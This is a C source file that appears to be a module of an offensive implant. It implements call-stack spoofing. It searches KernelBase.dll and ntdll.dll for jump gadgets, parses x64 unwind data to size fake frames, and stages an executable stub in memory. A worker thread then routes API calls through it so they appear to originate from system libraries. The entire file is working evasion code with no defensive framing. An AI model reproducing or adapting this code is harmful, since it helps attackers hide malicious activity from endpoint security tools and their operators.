#pragma GCC optimize ("O1", "no-omit-frame-pointer")

#include <windows.h>
#include <stddef.h>
#include "spoof.h"

#ifndef SPOOF_STITCH_GATE_ONLY
#define SPOOF_STITCH_GATE_ONLY 0
#endif

#if SPOOF_STITCH_GATE_ONLY
#define spoof_cut_configure_ms wininet_gate_configure
#define spoof_cut_configure    wininet_gate_configure_legacy
#define spoof_call             wininet_gate_call
#define spoof_call_handle      wininet_gate_call_handle
#define proxy_state_get        wininet_gate_state_get
#define dispatch_call          wininet_gate_dispatch_call
#define thread_is_impersonating wininet_gate_thread_is_impersonating
#define handle_fastpath_active wininet_gate_handle_fastpath_active
#define stitch_worker_entry    wininet_gate_worker_entry
#endif

DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA ( LPCSTR );
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress   ( HMODULE, LPCSTR );
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetTickCount     ( VOID );
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentThread ( VOID );
DECLSPEC_IMPORT PRUNTIME_FUNCTION NTAPI NTDLL$RtlLookupFunctionEntry (
    DWORD64, PDWORD64, PVOID );

#define HANDLE_RATE_WINDOW_MS    1000
#define HANDLE_RATE_THRESHOLD    200
#define HANDLE_FASTPATH_HOLD_MS  3000
#define STITCH_MIN_FRAME         0x68
#define STITCH_MAX_FRAME         0x400
#define UNW_FLAG_CHAININFO_LOCAL 0x04

typedef HANDLE ( WINAPI * FN_CreateThread ) ( LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );
typedef HANDLE ( WINAPI * FN_CreateEventA ) ( LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR );
typedef BOOL   ( WINAPI * FN_SetEvent ) ( HANDLE );
typedef DWORD  ( WINAPI * FN_WaitForSingleObjectEx ) ( HANDLE, DWORD, BOOL );
typedef HANDLE ( WINAPI * FN_GetProcessHeap ) ( VOID );
typedef LPVOID ( WINAPI * FN_HeapAlloc ) ( HANDLE, DWORD, SIZE_T );
typedef BOOL   ( WINAPI * FN_OpenThreadToken ) ( HANDLE, DWORD, BOOL, PHANDLE );
typedef BOOL   ( WINAPI * FN_CloseHandle ) ( HANDLE );
typedef LPVOID ( WINAPI * FN_VirtualAlloc ) ( LPVOID, SIZE_T, DWORD, DWORD );
typedef BOOL   ( WINAPI * FN_VirtualProtect ) ( LPVOID, SIZE_T, DWORD, PDWORD );
typedef DWORD  ( WINAPI * FN_GetLastError ) ( VOID );
typedef VOID   ( WINAPI * FN_SetLastError ) ( DWORD );

typedef ULONG_PTR ( WINAPI * FN0  ) ( VOID );
typedef ULONG_PTR ( WINAPI * FN1  ) ( ULONG_PTR );
typedef ULONG_PTR ( WINAPI * FN2  ) ( ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR ( WINAPI * FN3  ) ( ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR ( WINAPI * FN4  ) ( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR ( WINAPI * FN5  ) ( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR ( WINAPI * FN6  ) ( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR ( WINAPI * FN7  ) ( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR ( WINAPI * FN8  ) ( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR ( WINAPI * FN9  ) ( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );
typedef ULONG_PTR ( WINAPI * FN10 ) ( ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR );

typedef union {
    struct {
        BYTE CodeOffset;
        BYTE UnwindOp : 4;
        BYTE OpInfo   : 4;
    } Fields;
    USHORT FrameOffset;
} STITCH_UNWIND_CODE;

typedef struct {
    BYTE Version       : 3;
    BYTE Flags         : 5;
    BYTE SizeOfProlog;
    BYTE CountOfCodes;
    BYTE FrameRegister : 4;
    BYTE FrameOffset   : 4;
    STITCH_UNWIND_CODE UnwindCode[1];
} STITCH_UNWIND_INFO;

enum {
    STITCH_UWOP_PUSH_NONVOL     = 0,
    STITCH_UWOP_ALLOC_LARGE     = 1,
    STITCH_UWOP_ALLOC_SMALL     = 2,
    STITCH_UWOP_SET_FPREG       = 3,
    STITCH_UWOP_SAVE_NONVOL     = 4,
    STITCH_UWOP_SAVE_NONVOL_FAR = 5,
    STITCH_UWOP_EPILOG          = 6,
    STITCH_UWOP_SAVE_XMM128     = 8,
    STITCH_UWOP_SAVE_XMM128_FAR = 9,
    STITCH_UWOP_PUSH_MACHFRAME  = 10
};

typedef struct {
    PVOID  entry;
    SIZE_T frame_size;
    INT32  call_disp;
    INT8   jmp_disp;
} STITCH_GADGET;

typedef struct {
    HANDLE                    hWorker;          /* 0   */
    HANDLE                    hRequest;         /* 8   */
    HANDLE                    hDone;            /* 16  */
    FN_SetEvent               set_event;        /* 24  */
    FN_WaitForSingleObjectEx    wait_so;          /* 32  */
    FUNCTION_CALL *           pending_call;     /* 40  */
    ULONG_PTR                 result;           /* 48  */
    volatile LONG             stop;             /* 56  */
    BOOL                      ready;            /* 60  */
    PVOID                     gadget_entry;     /* 64  */
    SIZE_T                    gadget_frame_size;/* 72  */
    INT32                     gadget_call_disp; /* 80  */
    INT8                      gadget_jmp_disp;  /* 84  */
    BYTE                      pad[3];           /* 85  */
    ULONG_PTR                 saved_rbx;        /* 88  */
    ULONG_PTR                 saved_rsi;        /* 96  */
    PVOID                     continuation;     /* 104 */
    PVOID                     real_exit_thread;  /* 112 */
    PVOID                     raw_worker;        /* 120 */
    PVOID                     raw_base;          /* 128 */
    SIZE_T                    raw_size;          /* 136 */
    FN_GetLastError           get_last_error;    /* 144 */
    DWORD                     last_error;        /* 152 */
    DWORD                     error_pad;         /* 156 */
    FN_SetLastError           set_last_error;    /* 160 */
} PROXY_STATE;

_Static_assert ( offsetof ( PROXY_STATE, hRequest ) == 8, "hRequest" );
_Static_assert ( offsetof ( PROXY_STATE, hDone ) == 16, "hDone" );
_Static_assert ( offsetof ( PROXY_STATE, set_event ) == 24, "set_event" );
_Static_assert ( offsetof ( PROXY_STATE, wait_so ) == 32, "wait_so" );
_Static_assert ( offsetof ( PROXY_STATE, pending_call ) == 40, "pending_call" );
_Static_assert ( offsetof ( PROXY_STATE, result ) == 48, "result" );
_Static_assert ( offsetof ( PROXY_STATE, stop ) == 56, "stop" );
_Static_assert ( offsetof ( PROXY_STATE, gadget_entry ) == 64, "gadget_entry" );
_Static_assert ( offsetof ( PROXY_STATE, gadget_frame_size ) == 72, "frame" );
_Static_assert ( offsetof ( PROXY_STATE, gadget_call_disp ) == 80, "call_disp" );
_Static_assert ( offsetof ( PROXY_STATE, gadget_jmp_disp ) == 84, "jmp_disp" );
_Static_assert ( offsetof ( PROXY_STATE, saved_rbx ) == 88, "saved_rbx" );
_Static_assert ( offsetof ( PROXY_STATE, saved_rsi ) == 96, "saved_rsi" );
_Static_assert ( offsetof ( PROXY_STATE, continuation ) == 104, "continuation" );
_Static_assert ( offsetof ( PROXY_STATE, raw_worker ) == 120, "raw_worker" );
_Static_assert ( offsetof ( PROXY_STATE, get_last_error ) == 144, "get_last_error" );
_Static_assert ( offsetof ( PROXY_STATE, last_error ) == 152, "last_error" );
_Static_assert ( offsetof ( PROXY_STATE, set_last_error ) == 160, "set_last_error" );

#define STITCH_STUB_MAGIC 0x48435453UL

typedef struct {
    DWORD worker_offset;
    DWORD fixup_offset;
    DWORD blob_size;
    DWORD magic;
} STITCH_STUB_HEADER;

char _STITCH_STUB_[0] __attribute__ ( ( section ( "stitchcode" ) ) );

static PROXY_STATE * proxy_state_get ( VOID )
{
#if SPOOF_STITCH_GATE_ONLY
    DRAUGR_STATE * ds = draugr_state_get ();
    if ( ds == NULL ) return NULL;
    return ( PROXY_STATE * ) ( PVOID ) ds->wininet_gate_state;
#else
    DRAUGR_STATE * ds = draugr_state_get ();
    if ( ds == NULL ) return NULL;
    return ( PROXY_STATE * ) ( PVOID ) ds->cut_retaddr;
#endif
}

static ULONG_PTR dispatch_call ( FUNCTION_CALL * call )
{
    switch ( call->argc ) {
    case 0:  return ( ( FN0  ) call->ptr ) ();
    case 1:  return ( ( FN1  ) call->ptr ) ( call->args[0] );
    case 2:  return ( ( FN2  ) call->ptr ) ( call->args[0], call->args[1] );
    case 3:  return ( ( FN3  ) call->ptr ) ( call->args[0], call->args[1], call->args[2] );
    case 4:  return ( ( FN4  ) call->ptr ) ( call->args[0], call->args[1], call->args[2], call->args[3] );
    case 5:  return ( ( FN5  ) call->ptr ) ( call->args[0], call->args[1], call->args[2], call->args[3], call->args[4] );
    case 6:  return ( ( FN6  ) call->ptr ) ( call->args[0], call->args[1], call->args[2], call->args[3], call->args[4], call->args[5] );
    case 7:  return ( ( FN7  ) call->ptr ) ( call->args[0], call->args[1], call->args[2], call->args[3], call->args[4], call->args[5], call->args[6] );
    case 8:  return ( ( FN8  ) call->ptr ) ( call->args[0], call->args[1], call->args[2], call->args[3], call->args[4], call->args[5], call->args[6], call->args[7] );
    case 9:  return ( ( FN9  ) call->ptr ) ( call->args[0], call->args[1], call->args[2], call->args[3], call->args[4], call->args[5], call->args[6], call->args[7], call->args[8] );
    case 10: return ( ( FN10 ) call->ptr ) ( call->args[0], call->args[1], call->args[2], call->args[3], call->args[4], call->args[5], call->args[6], call->args[7], call->args[8], call->args[9] );
    default: return 0;
    }
}

static BOOL bytes_equal ( const BYTE * a, const BYTE * b, SIZE_T count )
{
    for ( SIZE_T i = 0; i < count; i++ )
        if ( a[i] != b[i] ) return FALSE;
    return TRUE;
}

static BOOL unwind_add_codes ( STITCH_UNWIND_INFO * ui, DWORD * size )
{
    for ( BYTE i = 0; i < ui->CountOfCodes; i++ )
    {
        BYTE op   = ui->UnwindCode[i].Fields.UnwindOp;
        BYTE info = ui->UnwindCode[i].Fields.OpInfo;

        switch ( op ) {
        case STITCH_UWOP_PUSH_NONVOL:
            *size += 8;
            break;
        case STITCH_UWOP_ALLOC_SMALL:
            *size += ( DWORD ) info * 8 + 8;
            break;
        case STITCH_UWOP_ALLOC_LARGE:
            if ( info == 0 ) {
                if ( i + 1 >= ui->CountOfCodes ) return FALSE;
                i++;
                *size += ( DWORD ) ui->UnwindCode[i].FrameOffset * 8;
            } else if ( info == 1 ) {
                DWORD lo, hi;
                if ( i + 2 >= ui->CountOfCodes ) return FALSE;
                lo = ui->UnwindCode[++i].FrameOffset;
                hi = ui->UnwindCode[++i].FrameOffset;
                *size += lo | ( hi << 16 );
            } else {
                return FALSE;
            }
            break;
        case STITCH_UWOP_SAVE_NONVOL:
        case STITCH_UWOP_SAVE_XMM128:
            if ( i + 1 >= ui->CountOfCodes ) return FALSE;
            i++;
            break;
        case STITCH_UWOP_SAVE_NONVOL_FAR:
        case STITCH_UWOP_SAVE_XMM128_FAR:
            if ( i + 2 >= ui->CountOfCodes ) return FALSE;
            i += 2;
            break;
        case STITCH_UWOP_EPILOG:
            if ( ui->Version != 2 ) return FALSE;
            break;
        case STITCH_UWOP_SET_FPREG:
        case STITCH_UWOP_PUSH_MACHFRAME:
        default:
            return FALSE;
        }
    }
    return TRUE;
}

static BOOL unwind_frame_size ( HMODULE module, PVOID pc, SIZE_T * frame_size )
{
    DWORD64 image_base = 0;
    PRUNTIME_FUNCTION rf;
    STITCH_UNWIND_INFO * ui;
    DWORD size = 0;

    *frame_size = 0;
    rf = NTDLL$RtlLookupFunctionEntry ( ( DWORD64 ) pc, &image_base, NULL );
    if ( rf == NULL || image_base != ( DWORD64 ) ( ULONG_PTR ) module )
        return FALSE;

    DWORD offset_in_function = ( DWORD ) ( ( ULONG_PTR ) pc - image_base - rf->BeginAddress );

    for ( DWORD depth = 0; depth < 8; depth++ )
    {
        ui = ( STITCH_UNWIND_INFO * ) ( ULONG_PTR ) ( image_base + rf->UnwindData );
        if ( ( ui->Version != 1 && ui->Version != 2 ) ||
             ui->FrameRegister != 0 ||
             ( ui->Flags & ~UNW_FLAG_CHAININFO_LOCAL ) != 0 )
            return FALSE;
        if ( depth == 0 && offset_in_function < ui->SizeOfProlog )
            return FALSE;
        if ( ! unwind_add_codes ( ui, &size ) )
            return FALSE;
        if ( ( ui->Flags & UNW_FLAG_CHAININFO_LOCAL ) == 0 )
            break;

        DWORD chain_index = ( ( DWORD ) ui->CountOfCodes + 1 ) & ~1UL;
        rf = ( PRUNTIME_FUNCTION ) ( PVOID ) &ui->UnwindCode[chain_index];
        if ( rf->BeginAddress == 0 || rf->EndAddress == 0 || rf->UnwindData == 0 )
            return FALSE;
    }

    if ( size < STITCH_MIN_FRAME || size > STITCH_MAX_FRAME || ( size & 0x0f ) != 8 )
        return FALSE;

    *frame_size = size;
    return TRUE;
}

static BOOL find_gadget_in_module ( HMODULE module, STITCH_GADGET * best )
{
    BYTE call_op[2] = { 0xff, 0x90 };
    BYTE jmp_op[2]  = { 0xff, 0x66 };
    BOOL found = FALSE;

    if ( module == NULL ) return FALSE;
    IMAGE_DOS_HEADER * dos = ( IMAGE_DOS_HEADER * ) module;
    if ( dos->e_magic != IMAGE_DOS_SIGNATURE ) return FALSE;
    IMAGE_NT_HEADERS * nt = ( IMAGE_NT_HEADERS * ) ( ( BYTE * ) module + dos->e_lfanew );
    if ( nt->Signature != IMAGE_NT_SIGNATURE ) return FALSE;

    IMAGE_SECTION_HEADER * sec = IMAGE_FIRST_SECTION ( nt );
    for ( WORD s = 0; s < nt->FileHeader.NumberOfSections; s++ )
    {
        if ( ( sec[s].Characteristics & IMAGE_SCN_MEM_EXECUTE ) == 0 )
            continue;
        BYTE * p   = ( BYTE * ) module + sec[s].VirtualAddress;
        BYTE * end = p + sec[s].Misc.VirtualSize;

        while ( p + 9 <= end )
        {
            if ( bytes_equal ( p, call_op, 2 ) && bytes_equal ( p + 6, jmp_op, 2 ) )
            {
                SIZE_T frame = 0;
                if ( unwind_frame_size ( module, p + 6, &frame ) &&
                     ( ! found || frame < best->frame_size ) )
                {
                    best->entry      = p;
                    best->frame_size = frame;
                    best->call_disp  = *( ( INT32 * ) ( p + 2 ) );
                    best->jmp_disp   = *( ( INT8 * ) ( p + 8 ) );
                    found = TRUE;
                }
            }
            p++;
        }
    }
    return found;
}

static BOOL resolve_stitch_gadget ( STITCH_GADGET * gadget )
{
    STITCH_GADGET candidate = { 0 };
    BOOL found = FALSE;

    HMODULE kb = KERNEL32$GetModuleHandleA ( "KernelBase.dll" );
    if ( kb == NULL ) kb = KERNEL32$GetModuleHandleA ( "kernelbase.dll" );
    if ( find_gadget_in_module ( kb, &candidate ) ) {
        *gadget = candidate;
        found = TRUE;
    }

    candidate.entry = NULL;
    candidate.frame_size = 0;
    HMODULE ntdll = KERNEL32$GetModuleHandleA ( "ntdll.dll" );
    if ( find_gadget_in_module ( ntdll, &candidate ) &&
         ( ! found || candidate.frame_size < gadget->frame_size ) )
    {
        *gadget = candidate;
        found = TRUE;
    }
    return found;
}

typedef DWORD ( WINAPI * FN_RawWorker ) ( LPVOID );

DWORD WINAPI stitch_worker_entry ( LPVOID param )
    __attribute__ ( ( naked, noinline, used ) );

DWORD WINAPI stitch_worker_entry ( LPVOID param )
{
    __asm__ volatile (
        ".rept 16\n"
        "nop\n"
        ".endr\n"
        "jmp qword ptr [rcx + 120]\n"
    );
}

void spoof_cut_configure_ms ( VOID )
{
    DRAUGR_STATE * ds = draugr_state_get ();
    if ( ds == NULL ) return;

#if SPOOF_STITCH_GATE_ONLY
    {
        PROXY_STATE * existing = ( PROXY_STATE * ) ( PVOID ) ds->wininet_gate_state;
        if ( existing != NULL && existing->ready ) return;
    }
#else
    if ( ds->ready == 1 && ds->cut_retaddr != 0 ) return;
#endif

    STITCH_GADGET gadget = { 0 };
    if ( ! resolve_stitch_gadget ( &gadget ) ) return;

    HMODULE k32 = KERNEL32$GetModuleHandleA ( "kernel32.dll" );
    if ( k32 == NULL ) return;

    FN_CreateThread        fn_thread    = ( FN_CreateThread )        KERNEL32$GetProcAddress ( k32, "CreateThread" );
    FN_CreateEventA        fn_event     = ( FN_CreateEventA )        KERNEL32$GetProcAddress ( k32, "CreateEventA" );
    FN_SetEvent            fn_set       = ( FN_SetEvent )            KERNEL32$GetProcAddress ( k32, "SetEvent" );
    FN_WaitForSingleObjectEx fn_wait      = ( FN_WaitForSingleObjectEx ) KERNEL32$GetProcAddress ( k32, "WaitForSingleObjectEx" );
    FN_GetProcessHeap      fn_heap      = ( FN_GetProcessHeap )      KERNEL32$GetProcAddress ( k32, "GetProcessHeap" );
    FN_HeapAlloc           fn_alloc     = ( FN_HeapAlloc )           KERNEL32$GetProcAddress ( k32, "HeapAlloc" );
    FN_VirtualAlloc        fn_va        = ( FN_VirtualAlloc )        KERNEL32$GetProcAddress ( k32, "VirtualAlloc" );
    FN_VirtualProtect      fn_vp        = ( FN_VirtualProtect )      KERNEL32$GetProcAddress ( k32, "VirtualProtect" );
    FN_GetLastError        fn_get_error = ( FN_GetLastError )        KERNEL32$GetProcAddress ( k32, "GetLastError" );
    FN_SetLastError        fn_set_error = ( FN_SetLastError )        KERNEL32$GetProcAddress ( k32, "SetLastError" );

    if ( fn_thread == NULL || fn_event == NULL || fn_set == NULL ||
         fn_wait == NULL || fn_heap == NULL || fn_alloc == NULL ||
         fn_va == NULL || fn_vp == NULL || fn_get_error == NULL || fn_set_error == NULL )
        return;

    STITCH_STUB_HEADER * stub_header = ( STITCH_STUB_HEADER * ) ( PVOID ) &_STITCH_STUB_;
    if ( stub_header->magic != STITCH_STUB_MAGIC ||
         stub_header->blob_size > 0x1000 ||
         stub_header->blob_size < sizeof ( STITCH_STUB_HEADER ) ||
         stub_header->worker_offset < sizeof ( STITCH_STUB_HEADER ) ||
         stub_header->worker_offset >= stub_header->blob_size ||
         stub_header->fixup_offset < sizeof ( STITCH_STUB_HEADER ) ||
         stub_header->fixup_offset >= stub_header->blob_size )
        return;

    HANDLE heap = fn_heap ();
    if ( heap == NULL ) return;

    PROXY_STATE * st = ( PROXY_STATE * ) fn_alloc ( heap, 0x00000008, sizeof ( PROXY_STATE ) );
    if ( st == NULL ) return;

    BYTE * raw_stub = ( BYTE * ) fn_va ( NULL, stub_header->blob_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( raw_stub == NULL ) return;

    for ( DWORD i = 0; i < stub_header->blob_size; i++ )
        raw_stub[i] = ( ( BYTE * ) ( PVOID ) stub_header )[i];

    DWORD old_protect = 0;
    if ( ! fn_vp ( raw_stub, stub_header->blob_size, PAGE_EXECUTE_READ, &old_protect ) )
        return;

    st->hRequest = fn_event ( NULL, FALSE, FALSE, NULL );
    st->hDone    = fn_event ( NULL, FALSE, FALSE, NULL );
    if ( st->hRequest == NULL || st->hDone == NULL ) return;

    st->set_event         = fn_set;
    st->wait_so           = fn_wait;
    st->gadget_entry      = gadget.entry;
    st->gadget_frame_size = gadget.frame_size;
    st->gadget_call_disp  = gadget.call_disp;
    st->gadget_jmp_disp   = gadget.jmp_disp;
    st->real_exit_thread  = ( PVOID ) KERNEL32$GetProcAddress ( k32, "ExitThread" );
    st->raw_base          = raw_stub;
    st->raw_size          = stub_header->blob_size;
    st->raw_worker        = raw_stub + stub_header->worker_offset;
    st->continuation      = raw_stub + stub_header->fixup_offset;
    st->get_last_error    = fn_get_error;
    st->set_last_error    = fn_set_error;

    DWORD tid = 0;
    volatile PVOID entry_base = ( PVOID ) stitch_worker_entry;
    LPTHREAD_START_ROUTINE worker_entry = ( LPTHREAD_START_ROUTINE ) ( PVOID )
        ( ( ( ULONG_PTR ) entry_base + 15 ) &
          ~( ULONG_PTR ) 15 );
    st->hWorker = fn_thread ( NULL, 0, worker_entry, st, 0, &tid );
    if ( st->hWorker == NULL ) return;

    st->ready = TRUE;

#if SPOOF_STITCH_GATE_ONLY
    ds->wininet_gate_state = ( ULONG_PTR ) ( PVOID ) st;
#else
    ds->cut_retaddr   = ( ULONG_PTR ) ( PVOID ) st;
    ds->cut_frameaddr = ( ULONG_PTR ) gadget.entry;
    ds->ready         = 1;
#endif
}

void spoof_cut_configure ( ULONG_PTR retaddr, ULONG_PTR frameaddr )
{
    ( void ) retaddr;
    ( void ) frameaddr;
    spoof_cut_configure_ms ();
}

static BOOL handle_fastpath_active ( VOID )
{
    DRAUGR_STATE * state = draugr_state_get ();
    if ( state == NULL ) return FALSE;

    DWORD now = KERNEL32$GetTickCount ();
    if ( state->handle_window_start == 0 || ( now - state->handle_window_start ) > HANDLE_RATE_WINDOW_MS ) {
        state->handle_window_start = now;
        state->handle_window_count = 1;
    } else {
        state->handle_window_count++;
        if ( state->handle_window_count >= HANDLE_RATE_THRESHOLD ) {
            state->handle_fastpath_until = now + HANDLE_FASTPATH_HOLD_MS;
            state->handle_window_start   = now;
            state->handle_window_count   = 0;
        }
    }
    return state->handle_fastpath_until != 0 && ( LONG ) ( now - state->handle_fastpath_until ) < 0;
}

ULONG_PTR spoof_call ( FUNCTION_CALL * call )
{
    PROXY_STATE * st;

    if ( call == NULL || call->ptr == NULL || call->argc < 0 || call->argc > 10 )
        return 0;

#if SPOOF_STITCH_GATE_ONLY
    st = proxy_state_get ();
#else
    {
        DRAUGR_STATE * ds = draugr_state_get ();
        if ( ds == NULL ) return dispatch_call ( call );
        st = ( PROXY_STATE * ) ( PVOID ) ds->cut_retaddr;
    }
#endif

    if ( st != NULL && st->real_exit_thread == call->ptr )
        return dispatch_call ( call );

    if ( st == NULL || ! st->ready ) {
        spoof_cut_configure_ms ();
        st = proxy_state_get ();
    }

    if ( st != NULL && st->ready && st->hWorker != NULL )
    {
        st->pending_call = call;
        st->result = 0;
        st->set_event ( st->hRequest );
        st->wait_so ( st->hDone, INFINITE, FALSE );
        ULONG_PTR result = st->result;
        DWORD last_error = st->last_error;
        st->set_last_error ( last_error );
        return result;
    }

#if SPOOF_STITCH_GATE_ONLY
    return 0;
#else
    return dispatch_call ( call );
#endif
}

ULONG_PTR spoof_call_handle ( FUNCTION_CALL * call )
{
    if ( call == NULL || call->ptr == NULL ) return 0;
    if ( handle_fastpath_active () ) return dispatch_call ( call );
    return spoof_call ( call );
}
